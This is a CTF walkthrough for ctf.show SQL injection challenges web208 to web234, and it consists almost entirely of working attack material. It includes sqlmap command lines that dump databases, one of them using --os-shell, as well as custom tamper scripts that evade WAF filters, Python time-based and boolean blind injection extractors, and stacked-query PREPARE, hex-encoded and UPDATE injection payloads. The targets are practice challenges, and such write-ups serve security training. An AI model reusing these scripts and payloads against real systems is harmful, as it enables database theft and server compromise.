python sqlmap.py -u http://b9caea2a-1a06-427e-8c84-414800ea283d.challenge.ctf.show:8080/api/index.php --dbs --cookie="PHPSESSID=c62969k6d4bhjd70uqf73bb7pc" --safe-url=http://b9caea2a-1a06-427e-8c84-414800ea283d.challenge.ctf.show:8080/api/getToken.php  --safe-freq=1 --method=PUT --data="id=1" --headers="Content-Type: text/plain" --dbms=mysql --referer=http://b9caea2a-1a06-427e-8c84-414800ea283d.challenge.ctf.show:8080/sqlmap --tamper="tamper/space2comment.py,tamper/randomcase.py"
爆表名
python sqlmap.py -u http://b9caea2a-1a06-427e-8c84-414800ea283d.challenge.ctf.show:8080/api/index.php -D ctfshow_web --tables --cookie="PHPSESSID=c62969k6d4bhjd70uqf73bb7pc" --safe-url=http://b9caea2a-1a06-427e-8c84-414800ea283d.challenge.ctf.show:8080/api/getToken.php  --safe-freq=1 --method=PUT --data="id=1" --headers="Content-Type: text/plain" --dbms=mysql --referer=http://b9caea2a-1a06-427e-8c84-414800ea283d.challenge.ctf.show:8080/sqlmap --tamper="tamper/space2comment.py,tamper/randomcase.py"
爆列名
python sqlmap.py -u http://b9caea2a-1a06-427e-8c84-414800ea283d.challenge.ctf.show:8080/api/index.php -D ctfshow_web -T ctfshow_flaxcac --columns --cookie="PHPSESSID=c62969k6d4bhjd70uqf73bb7pc" --safe-url=http://b9caea2a-1a06-427e-8c84-414800ea283d.challenge.ctf.show:8080/api/getToken.php  --safe-freq=1 --method=PUT --data="id=1" --headers="Content-Type: text/plain" --dbms=mysql --referer=http://b9caea2a-1a06-427e-8c84-414800ea283d.challenge.ctf.show:8080/sqlmap --tamper="tamper/space2comment.py,tamper/randomcase.py"
爆数据
python sqlmap.py -u http://b9caea2a-1a06-427e-8c84-414800ea283d.challenge.ctf.show:8080/api/index.php -D ctfshow_web -T ctfshow_flaxcac -C flagvca --dump --cookie="PHPSESSID=c62969k6d4bhjd70uqf73bb7pc" --safe-url=http://b9caea2a-1a06-427e-8c84-414800ea283d.challenge.ctf.show:8080/api/getToken.php  --safe-freq=1 --method=PUT --data="id=1" --headers="Content-Type: text/plain" --dbms=mysql --referer=http://b9caea2a-1a06-427e-8c84-414800ea283d.challenge.ctf.show:8080/sqlmap --tamper="tamper/space2comment.py,tamper/randomcase.py"

```

## web209

> 



```
function waf($str){
   //TODO 未完工
   return preg_match('/ |\*|\=/', $str);
  }

```

```
from lib.core.compat import xrange
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOW

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Replaces space character (' ') with comments '/**/'

    Tested against:
        * Microsoft SQL Server 2005
        * MySQL 4, 5.0 and 5.5
        * Oracle 10g
        * PostgreSQL 8.3, 8.4, 9.0

    Notes:
        * Useful to bypass weak and bespoke web application firewalls

    &gt;&gt;&gt; tamper('SELECT id FROM users')
    'SELECT/**/id/**/FROM/**/users'
    """

    retVal = payload

    if payload:
        retVal = ""
        quote, doublequote, firstspace = False, False, False

        for i in xrange(len(payload)):
            if not firstspace:
                if payload[i].isspace():
                    firstspace = True
                    retVal += chr(0x0a)
                    continue

            elif payload[i] == '\'':
                quote = not quote

            elif payload[i] == '"':
                doublequote = not doublequote

            elif payload[i] == "*":
                retVal += chr(0x31)
                continue

            elif payload[i] == '=':
                retVal += (chr(0x0a) + 'like' + chr(0x0a))
                continue

            elif payload[i] == " " and not doublequote and not quote:
                retVal += chr(0x0a)
                continue

            retVal += payload[i]

    return retVal

```

```
爆库名
python sqlmap.py -u http://cbcbfd8b-ea3b-4fef-8225-26305b8b923d.challenge.ctf.show:8080/api/index.php --dbs --cookie="PHPSESSID=c62969k6d4bhjd70uqf73bb7pc" --safe-url=http://cbcbfd8b-ea3b-4fef-8225-26305b8b923d.challenge.ctf.show:8080/api/getToken.php  --safe-freq=1 --method=PUT --data="id=1" --headers="Content-Type: text/plain" --dbms=mysql --referer=http://cbcbfd8b-ea3b-4fef-8225-26305b8b923d.challenge.ctf.show:8080/sqlmap --tamper="tamper/ctfshow_web209.py"
爆表名
python sqlmap.py -u http://cbcbfd8b-ea3b-4fef-8225-26305b8b923d.challenge.ctf.show:8080/api/index.php -D ctfshow_web --tables --cookie="PHPSESSID=c62969k6d4bhjd70uqf73bb7pc" --safe-url=http://cbcbfd8b-ea3b-4fef-8225-26305b8b923d.challenge.ctf.show:8080/api/getToken.php  --safe-freq=1 --method=PUT --data="id=1" --headers="Content-Type: text/plain" --dbms=mysql --referer=http://cbcbfd8b-ea3b-4fef-8225-26305b8b923d.challenge.ctf.show:8080/sqlmap --tamper="tamper/ctfshow_web209.py"
爆列名
python sqlmap.py -u http://cbcbfd8b-ea3b-4fef-8225-26305b8b923d.challenge.ctf.show:8080/api/index.php -D ctfshow_web -T ctfshow_flav --columns --cookie="PHPSESSID=c62969k6d4bhjd70uqf73bb7pc" --safe-url=http://cbcbfd8b-ea3b-4fef-8225-26305b8b923d.challenge.ctf.show:8080/api/getToken.php  --safe-freq=1 --method=PUT --data="id=1" --headers="Content-Type: text/plain" --dbms=mysql --referer=http://cbcbfd8b-ea3b-4fef-8225-26305b8b923d.challenge.ctf.show:8080/sqlmap --tamper="tamper/ctfshow_web209.py"
爆数据
python sqlmap.py -u http://cbcbfd8b-ea3b-4fef-8225-26305b8b923d.challenge.ctf.show:8080/api/index.php -D ctfshow_web -T ctfshow_flav -C ctfshow_flagx --dump --cookie="PHPSESSID=c62969k6d4bhjd70uqf73bb7pc" --safe-url=http://cbcbfd8b-ea3b-4fef-8225-26305b8b923d.challenge.ctf.show:8080/api/getToken.php  --safe-freq=1 --method=PUT --data="id=1" --headers="Content-Type: text/plain" --dbms=mysql --referer=http://cbcbfd8b-ea3b-4fef-8225-26305b8b923d.challenge.ctf.show:8080/sqlmap --tamper="tamper/ctfshow_web209.py"

```

## web210

> 



```
import base64
from lib.core.compat import xrange
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOW

def dependencies():
    pass

def tamper(payload, **kwargs):
    retVal = payload
    if payload:
        retVal = retVal.encode('utf-8')
        retVal = retVal[::-1]
        retVal = base64.b64encode(retVal)
        retVal = retVal[::-1]
        retVal = base64.b64encode(retVal)

    return retVal.decode('utf-8')

```

```
python sqlmap.py -u http://c348c3e4-32c4-4f28-acac-70ecf9ab89c7.challenge.ctf.show:8080/api/index.php --dump --cookie="PHPSESSID=o4ht5t1l0jp0irjreiqmonpdnf" --safe-url=http://c348c3e4-32c4-4f28-acac-70ecf9ab89c7.challenge.ctf.show:8080/api/getToken.php  --safe-freq=1 --method=PUT --data="id=1" --headers="Content-Type: text/plain" --dbms=mysql --referer=http://c348c3e4-32c4-4f28-acac-70ecf9ab89c7.challenge.ctf.show:8080/sqlmap --tamper="tamper/ctfshow_web210.py"

```

## web211

> 



```
python sqlmap.py -u http://b0b5178d-a99e-4a41-933c-87cdede6dc25.challenge.ctf.show:8080/api/index.php -C ctfshow_web -T ctfshow_flavia --dump --cookie="PHPSESSID=vu47t88j6pjdun7dfajq8lfuus" --safe-url=http://b0b5178d-a99e-4a41-933c-87cdede6dc25.challenge.ctf.show:8080/api/getToken.php  --safe-freq=1 --method=PUT --data="id=1" --headers="Content-Type: text/plain" --dbms=mysql --referer=http://b0b5178d-a99e-4a41-933c-87cdede6dc25.challenge.ctf.show:8080/sqlmap --tamper="tamper/space2comment.py,tamper/ctfshow_web210.py"

```

## web212

> 



```
function decode($id){
    return strrev(base64_decode(strrev(base64_decode($id))));
}
function waf($str){
    return preg_match('/ |\*/', $str);
}

```

```
import base64
from lib.core.compat import xrange
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    payload = changeChar(payload)
    payload = baseChange(payload)

    return payload

def baseChange(payload):
    retVal = payload

    if payload:
        retVal = base64.b64encode(payload[::-1].encode('utf-8'))
        retVal = base64.b64encode(retVal[::-1].encode('utf-8'))

    return retVal

def changeChar(payload):
    retVal = payload

    if payload:
        retVal = ""
        quote, doublequote, firstspace = False, False, False

        for i in xrange(len(payload)):
            if not firstspace:
                if payload[i].isspace():
                    firstspace = True
                    retVal += chr(0x0a)
                    continue

            elif payload[i] == '\'':
                quote = not quote

            elif payload[i] == '"':
                doublequote = not doublequote

            elif payload[i] == "=":
                retVal += chr(0x0a)+'like'+chr(0x0a)
                continue

            elif payload[i] == "*":
                retVal += chr(0x31)
                continue

            elif payload[i] == " " and not doublequote and not quote:
                retVal += chr(0x0a)
                continue

            retVal += payload[i]

    return retVal

```

```
python sqlmap.py -u http://9c29df34-758b-40bc-b6d7-087ae08ce1b3.challenge.ctf.show:8080/api/index.php -C ctfshow_web -T ctfshow_flavia --dump --cookie="PHPSESSID=jmn3cp01f6qiaktbs2hf1c7tcb" --safe-url=http://9c29df34-758b-40bc-b6d7-087ae08ce1b3.challenge.ctf.show:8080/api/getToken.php  --safe-freq=1 --method=PUT --data="id=1" --headers="Content-Type: text/plain" --dbms=mysql --referer=http://9c29df34-758b-40bc-b6d7-087ae08ce1b3.challenge.ctf.show:8080/sqlmap --tamper="tamper/ctfshow_web212.py"

```

## web213

> 



```
python sqlmap.py -u http://0a771e91-88e4-491f-9e3c-a999910df646.challenge.ctf.show:8080/api/index.php -C ctfshow_web -T ctfshow_flavia --dump --cookie="PHPSESSID=jmn3cp01f6qiaktbs2hf1c7tcb" --safe-url=http://0a771e91-88e4-491f-9e3c-a999910df646.challenge.ctf.show:8080/api/getToken.php  --safe-freq=1 --method=PUT --data="id=1" --headers="Content-Type: text/plain" --dbms=mysql --referer=http://0a771e91-88e4-491f-9e3c-a999910df646.challenge.ctf.show:8080/sqlmap --tamper="tamper/ctfshow_web212.py" --os-shell

```

## web214

> 



```
import time
import requests
from tqdm import tqdm

def timeBlindSql(url):
    strings = 'flag{b7c4de-2hi1jk0mn5o3p6q8rstuvw9xyz}'
    flag = ''
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    for i in tqdm(range(1,100)):
        low = 32
        high = 127
        while low &lt; high:
            mid = (low + high) &gt;&gt; 1
            # payload = "ip=if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()), {}, 1)) &gt; {}, sleep(5), 1)&amp;debug=0".format(i, mid)
            # payload = "ip=if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagx'), {}, 1)) &gt; {}, sleep(5), 1)&amp;debug=0".format(i, mid)
            payload = "if(ord(substr((select group_concat(flaga) from ctfshow_flagx), {}, 1)) &gt; {}, sleep(10), 0)"
            data = {
                'ip' : payload.format(i,mid),
                'debug' : '0'
            }
            start_time = time.time()
            requests.post(url=url, data=data, headers=headers)
            end_time = time.time()
            diff_time = end_time - start_time
            if diff_time &lt; 5:
                high = mid
            else:
                low = mid + 1
        if low != 32:
            flag += chr(low)
            print('[+] ' + flag)
            if chr(low) == '}':
                exit(0)
            continue
        else:
            break
            
            

if __name__ == '__main__':
    url = "http://ef70ed65-e433-4de2-a818-2ca353cf48f1.challenge.ctf.show:8080/api/"
    timeBlindSql(url)

```

## web215

> 



```
import time
import requests
from tqdm import tqdm

def timeBlindSql(url):
    strings = 'flag{b7c4de-2hi1jk0mn5o3p6q8rstuvw9xyz}'
    flag = ''
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    for i in tqdm(range(1,100)):
        low = 32
        high = 127
        while low &lt; high:
            mid = (low + high) &gt;&gt; 1
            # payload = "1' or if(ord(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()), {}, 1)) &gt; {}, sleep(10), 0) and '1'='1"
            # payload = "1' or if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagxc'), {}, 1)) &gt; {}, sleep(10), 0) and '1'='1"
            payload = "1' or if(ord(substr((select group_concat(flagaa) from ctfshow_flagxc), {}, 1)) &gt; {}, sleep(10), 0) and '1'='1"
            data = {
                'ip' : payload.format(i,mid),
                'debug' : '0'
            }
            start_time = time.time()
            requests.post(url=url, data=data, headers=headers)
            end_time = time.time()
            diff_time = end_time - start_time
            if diff_time &lt; 6:
                high = mid
            else:
                low = mid + 1
        if low != 32:
            flag += chr(low)
            print('[+] ' + flag)
            if chr(low) == '}':
                exit(0)
            continue
        else:
            break
            
            

if __name__ == '__main__':
    url = "http://c0a8a32e-de49-44f5-9529-adec4d73e5d2.challenge.ctf.show:8080/api/"
    timeBlindSql(url)

```

## web216

> 



```
import time
import requests
from tqdm import tqdm

def timeBlindSql(url):
    strings = 'flag{b7c4de-2hi1jk0mn5o3p6q8rstuvw9xyz}'
    flag = ''
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    for i in tqdm(range(1,100)):
        low = 32
        high = 127
        while low &lt; high:
            mid = (low + high) &gt;&gt; 1
            payload = "'MQ==') or if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()), {}, 1)) &gt; {}, sleep(10), 0) and ('1'"
            # payload = "'MQ==') or if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagxcc'), {}, 1)) &gt; {}, sleep(10), 0) and ('1'"
            # payload = "'MQ==') or if(ord(substr((select group_concat(flagaac) from ctfshow_flagxcc), {}, 1)) &gt; {}, sleep(10), 0) and and ('1'"
            data = {
                'ip' : payload.format(i,mid),
                'debug' : '0'
            }
            start_time = time.time()
            requests.post(url=url, data=data, headers=headers)
            end_time = time.time()
            diff_time = end_time - start_time
            if diff_time &lt; 5:
                high = mid
            else:
                low = mid + 1
        if low != 32:
            flag += chr(low)
            print('[+] ' + flag)
            if chr(low) == '}':
                exit(0)
            continue
        else:
            break
            

if __name__ == '__main__':
    url = "http://e05e7a5d-17a6-4412-b134-4a92df2c7f85.challenge.ctf.show:8080/api/"
    timeBlindSql(url)

```

## web217

> 



```
import time
import requests
from tqdm import tqdm

def timeBlindSql(url):
    strings = 'flag{b7c4de-2hi1jk0mn5o3p6q8rstuvw9xyz}'
    flag = ''
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    for i in tqdm(range(1,100)):
        low = 32
        high = 127
        while low &lt; high:
            mid = (low + high) &gt;&gt; 1
            payload = "'1') or if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()), {}, 1)) &gt; {}, benchmark(30000000,sha(1)), 0) and ('1'"
            # payload = "'1') or if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagxcc'), {}, 1)) &gt; {}, benchmark(30000000,sha(1)), 0) and ('1'"
            # payload = "'1') or if(ascii(substr((select group_concat(flagaac) from ctfshow_flagxcc), {}, 1)) &gt; {}, benchmark(30000000,sha(1)), 0) and and ('1'"
            data = {
                'ip' : payload.format(i,mid),
                'debug' : '0'
            }
            print(data)
            start_time = time.time()
            requests.post(url=url, data=data, headers=headers)
            end_time = time.time()
            diff_time = end_time - start_time
            if diff_time &lt; 5:
                high = mid
            else:
                low = mid + 1
        if low != 32:
            flag += chr(low)
            print('[+] ' + flag)
            if chr(low) == '}':
                exit(0)
            continue
        else:
            break
            

if __name__ == '__main__':
    url = "http://5c27dc9d-7b54-4ed4-a889-8a8a6bbbedfd.challenge.ctf.show:8080/api/"
    timeBlindSql(url)

```

## web218

> 



```
import time
import requests
from tqdm import tqdm

def timeBlindSql(url):
    strings = 'flag{b7c4de-2hi1jk0mn5o3p6q8rstuvw9xyz}'
    flag = ''
    T = '(SELECT count(*) FROM information_schema.columns A, information_schema.schemata B, information_schema.schemata C, information_schema.schemata D, information_schema.schemata E, information_schema.schemata F)'
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    for i in tqdm(range(1,100)):
        low = 32
        high = 127
        while low &lt; high:
            mid = (low + high) &gt;&gt; 1
            payload = "'1') or if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()), {}, 1)) &gt; {}, {}, 0) and ('1'"
            # payload = "'1') or if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagxc'), {}, 1)) &gt; {}, {}, 0) and ('1'"
            # payload = "'1') or if(ascii(substr((select group_concat(flagaac) from ctfshow_flagxc), {}, 1)) &gt; {}, {}, 0) and and ('1'"
            data = {
                'ip' : payload.format(i,mid,T),
                'debug' : '0'
            }
            print(data)
            start_time = time.time()
            requests.post(url=url, data=data, headers=headers)
            end_time = time.time()
            diff_time = end_time - start_time
            if diff_time &lt; 5:
                high = mid
            else:
                low = mid + 1
        if low != 32:
            flag += chr(low)
            print('[+] ' + flag)
            if chr(low) == '}':
                exit(0)
            continue
        else:
            break
            

if __name__ == '__main__':
    url = "http://5852e0e7-7fb0-48da-94a9-551148fc9864.challenge.ctf.show:8080/api/"
    timeBlindSql(url)

```

## web219

> 



```
import time
import requests
from tqdm import tqdm

def timeBlindSql(url):
    strings = 'flag{b7c4de-2hi1jk0mn5o3p6q8rstuvw9xyz}'
    flag = ''
    T = '(SELECT count(*) FROM information_schema.columns A, information_schema.schemata B, information_schema.schemata C, information_schema.schemata D, information_schema.schemata E, information_schema.schemata F)'
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    for i in tqdm(range(1,100)):
        low = 32
        high = 127
        while low &lt; high:
            mid = (low + high) &gt;&gt; 1
            payload = "'1') or if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()), {}, 1)) &gt; {}, {}, 0) and ('1'"
            # payload = "'1') or if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagxcc'), {}, 1)) &gt; {}, {}, 0) and ('1'"
            # payload = "'1') or if(ascii(substr((select group_concat(flagaac) from ctfshow_flagxcc), {}, 1)) &gt; {}, {}, 0) and and ('1'"
            data = {
                'ip' : payload.format(i,mid,T),
                'debug' : '0'
            }
            print(data)
            start_time = time.time()
            requests.post(url=url, data=data, headers=headers)
            end_time = time.time()
            diff_time = end_time - start_time
            if diff_time &lt; 4:
                high = mid
            else:
                low = mid + 1
        if low != 32:
            flag += chr(low)
            print('[+] ' + flag)
            if chr(low) == '}':
                exit(0)
            continue
        else:
            break
            

if __name__ == '__main__':
    url = "http://4c7e8954-4478-4007-975b-ce06c34edfb8.challenge.ctf.show:8080/api/"
    timeBlindSql(url)

```

## web220

> 



```
import time
import requests
from tqdm import tqdm

def timeBlindSql(url):
    strings = 'flag{b7c4de-2hi1jk0mn5o3p6q8rstuvw9xyz}'
    flag = 'ct'
    T = '(SELECT count(*) FROM information_schema.columns A, information_schema.schemata B, information_schema.schemata C, information_schema.schemata D, information_schema.schemata E, information_schema.schemata F, information_schema.schemata G)'
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    for i in tqdm(range(3,100)):
        for ch in strings:
            payload = "'1') or if(left((select table_name from information_schema.tables where table_schema=database() limit 0,1), {})like'{}', {}, 0) and ('1'"
            data = {
                'ip' : payload.format(i,flag+ch,T),
                'debug' : '0'
            }
            print(data)
            start_time = time.time()
            requests.post(url=url, data=data, headers=headers)
            end_time = time.time()
            diff_time = end_time - start_time
            if diff_time &lt; 4:
                continue
            else:
                flag = flag + ch
                print('[+] ' + flag)
                break

if __name__ == '__main__':
    url = "http://41ac10b3-19ba-4719-849b-b6f8a6a2efc1.challenge.ctf.show:8080/api/"
    timeBlindSql(url)

```

## web221

> 



```
http://1c1edfaa-f567-4fba-a04f-285c886e937d.chall.ctf.show/api/?page=2&amp;limit=1 procedure  analyse(extractvalue(rand(),concat(0x3a,database())),1)

```

## web222

```
import requests
from tqdm import tqdm

headers = {
    'Content-Type' : 'application/x-www-form-urlencoded',
    'User-Agent' : 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0'
}
flag = ''
def groupBySql(url):
    global flag
    for i in tqdm(range(1,50)):
        low = 32
        high = 127
        while low &lt; high:
            mid = (high + low) &gt;&gt; 1
            # payload = 'u=if(ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()),{},1))&gt;{},username,1)&amp;page=1&amp;limit=10'.format(i, mid)
            # payload = 'u=if(ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=\'ctfshow_flaga\'),{},1))&gt;{},username,1)&amp;page=1&amp;limit=10'.format(i, mid)
            payload = 'u=if(ascii(substr((select/**/group_concat(flagaabc)/**/from/**/ctfshow_flaga),{},1))&gt;{},username,1)&amp;page=1&amp;limit=10'.format(i, mid)
            print(payload)
            res = requests.get(url=url, params=payload, headers=headers)
            if 'userAUTO' in res.text:
                low = mid + 1
            else:
                high = mid
        if low != 32:
            flag += chr(low)
            print('[+] ' + flag)
            if chr(low) == '}':
                exit(0)
        else:
            break

if __name__ == '__main__':
    url = 'http://a922ab82-0b09-4168-b545-7fec8ebf2419.challenge.ctf.show:8080/api/'
    groupBySql(url)

```

## web223

```
import requests
from tqdm import tqdm
import urllib.parse

# headers = {
#     'Content-Type' : 'application/x-www-form-urlencoded',
#     'User-Agent' : 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0'
# }
flag = ''

def getNumber(num):
    result = 'true'
    if num == 1:
        return result
    else:
        for i in range(num - 1):
            result += '+true'
        return result


def groupBySql(url):
    global flag
    for i in tqdm(range(1,50)):
        low = 32
        high = 127
        while low &lt; high:
            mid = (high + low) &gt;&gt; 1
            # payload = {'u' : f"if(ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()),{getNumber(i)},{getNumber(1)}))&gt;({getNumber(mid)}),username,'a')"}
            # payload = {'u' : f"if(ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name='ctfshow_flagas'),{getNumber(i)},{getNumber(1)}))&gt;({getNumber(mid)}),username,'a')"}
            payload = {'u' : f"if(ascii(substr((select/**/group_concat(flagasabc)/**/from/**/ctfshow_flagas),{getNumber(i)},{getNumber(1)}))&gt;({getNumber(mid)}),username,'a')"}
            print(payload)
            res = requests.get(url=url, params=payload)
            if 'userAUTO' in res.text:
                low = mid + 1
            else:
                high = mid
        if low != 32:
            flag += chr(low)
            print('[+] ' + flag)
            if chr(low) == '}':
                exit(0)
        else:
            break

if __name__ == '__main__':
    url = 'http://8a1651f0-0cea-47cd-a662-15891b0889de.challenge.ctf.show:8080/api/'
    groupBySql(url)

```

## web224

> 



## web225

> 



```
查找表名
?username=1';show tables;
查找数据
?username=1';handler ctfshow_flagasa open;handler ctfshow_flagasa read first;

或者用预编译来做

?username=1';PREPARE H3rmesk1t from concat('sel','ect * from ctfshow_flagasa');EXECUTE H3rmesk1t;

```

## web226

> 



```
?username=1';PREPARE demo from 0x73686f77207461626c6573;EXECUTE demo;
?username=1';PREPARE demo from 0x73656c656374202a2066726f6d2063746673685f6f775f666c61676173;EXECUTE demo;

```

## web227

> 



```
直接拿到 Flag 或者发现自定义的 getflag 函数通过 call getFlag(); 来获取 Flag
?username=1';PREPARE demo from 0x73656c656374202a2066726f6d20696e666f726d6174696f6e5f736368656d612e526f7574696e6573;EXECUTE demo;

```

## web228

> 



```
?username=1';PREPARE demo from 0x73686f77207461626c6573;EXECUTE demo;
?username=1';PREPARE demo from 0x73656c656374202a2066726f6d2063746673685f6f775f666c616761736161;EXECUTE demo;

```

## web229

> 



```
?username=1';PREPARE demo from 0x73686f77207461626c6573;EXECUTE demo;
?username=1';PREPARE demo from 0x73656c656374202a2066726f6d20666c6167;EXECUTE demo;

```

## web230

> 



```
?username=1';PREPARE demo from 0x73686f77207461626c6573;EXECUTE demo;
?username=1';PREPARE demo from 0x73656c656374202a2066726f6d20666c61676161626278;EXECUTE demo;

```

## web231

> 



```
爆表名
password=1',username=(select group_concat(table_name) from information_schema.tables where table_schema=database()) where 1=1#&amp;username=1
爆列名
password=1',username=(select group_concat(column_name) from information_schema.columns where table_name='flaga') where 1=1#&amp;username=1
爆数据
password=1',username=(select flagas from flaga) where 1=1#&amp;username=1

```

## web232

> 



```
爆表名
password=1'),username=(select group_concat(table_name) from information_schema.tables where table_schema=database()) where 1=1#&amp;username=1
爆列名
password=1'),username=(select group_concat(column_name) from information_schema.columns where table_name='flaga') where 1=1#&amp;username=1
爆数据
password=1'),username=(select flagas from flaga) where 1=1#&amp;username=1

```

## web233

> 



```
import time
import requests
from tqdm import tqdm

def timeBlindSql(url):
    strings = 'flag{b7c4de-2hi1jk0mn5o3p6q8rstuvw9xyz}'
    flag = 'ct'
    T = '(SELECT count(*) FROM information_schema.columns A, information_schema.schemata B, information_schema.schemata C, information_schema.schemata D, information_schema.schemata E, information_schema.schemata F, information_schema.schemata G)'
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    for i in tqdm(range(3,100)):
        for ch in strings:
            payload = "'1') or if(left((select table_name from information_schema.tables where table_schema=database() limit 0,1), {})like'{}', {}, 0) and ('1'"
            data = {
                'ip' : payload.format(i,flag+ch,T),
                'debug' : '0'
            }
            print(data)
            start_time = time.time()
            requests.post(url=url, data=data, headers=headers)
            end_time = time.time()
            diff_time = end_time - start_time
            if diff_time &lt; 4:
                continue
            else:
                flag = flag + ch
                print('[+] ' + flag)
                break

if __name__ == '__main__':
    url = "http://41ac10b3-19ba-4719-849b-b6f8a6a2efc1.challenge.ctf.show:8080/api/"
    timeBlindSql(url)

```

## web234

> 



```
username=,username=(select group_concat(table_name) from information_schema.columns where table_schema=database())-- - &amp;password=\
username=,username=(select group_concat(column_name) from information_schema.columns where table_name=0x666c6167323361)-- - &amp;password=\
username=,username=(select flagass23s3 from flag23a)-- - &amp;password=\

```
